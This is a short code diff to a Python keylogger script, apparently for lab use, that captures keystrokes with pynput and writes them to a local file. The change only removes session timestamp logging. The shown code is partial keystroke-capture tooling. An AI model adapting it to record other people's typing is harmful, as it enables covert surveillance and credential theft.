@@ -1,8 +1,7 @@
-# keylogger.py - records keystrokes to a local file
+# keylogger.py - records keystrokes to a local file 
 # Authorized lab use only. Press ESC to stop.
 
 from pynput import keyboard
-from datetime import datetime
 
 LOG_FILE = "keylog.txt"
 
@@ -31,10 +30,8 @@ def on_release(key):
 
 def main():
     print("Keylogger running - press ESC to stop.")
-    write_log(f"\n--- session start {datetime.now()} ---\n")
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
-    write_log(f"\n--- session end {datetime.now()} ---\n")
 
 
 if __name__ == "__main__":
